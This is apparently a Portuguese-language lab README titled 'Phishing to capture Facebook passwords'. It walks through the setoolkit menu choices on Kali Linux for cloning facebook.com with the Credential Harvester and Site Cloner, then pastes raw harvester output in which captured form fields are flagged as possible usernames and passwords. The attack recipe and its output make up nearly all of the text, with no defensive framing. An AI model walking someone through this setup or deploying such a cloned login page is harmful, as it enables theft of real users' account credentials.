# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados

![Alt text](./passwd.png "Optional title")

Após executar passo a passo, segue resultado:

10.0.2.15 - - [31/Jan/2025 12:58:30] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                          
PARAM: local_storage[Session]=20                                                               
PARAM: local_storage[signal_flush_timestamp]=13                                                
PARAM: session_storage[TabId]=6                                                                
PARAM: session_storage[sp_pi]=216                                                              
PARAM: logtime=2                                                                               
PARAM: __aaid=0                                                                                
POSSIBLE USERNAME FIELD FOUND: __user=0                                                        
PARAM: __a=1                                                                                   
PARAM: __req=l                                                                                 
PARAM: __hs=20119.BP:DEFAULT.2.0...0                                                           
PARAM: dpr=2                                                                                   
PARAM: __ccg=EXCELLENT                                                                         
PARAM: __rev=1019736753                                                                        
PARAM: __s=:tpocfc:r2c3zm                                                                      
PARAM: __hsi=7466094569697707100                                                               
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O09yyE1582ZwrU1Xo1UU3jwea                                                              
PARAM: __csr=                                                                                  
PARAM: lsd=AVrBNYetcG4                                                                         
PARAM: jazoest=2937                                                                            
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019736753                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                  
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1738335604                                             
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                  
                                                                                          
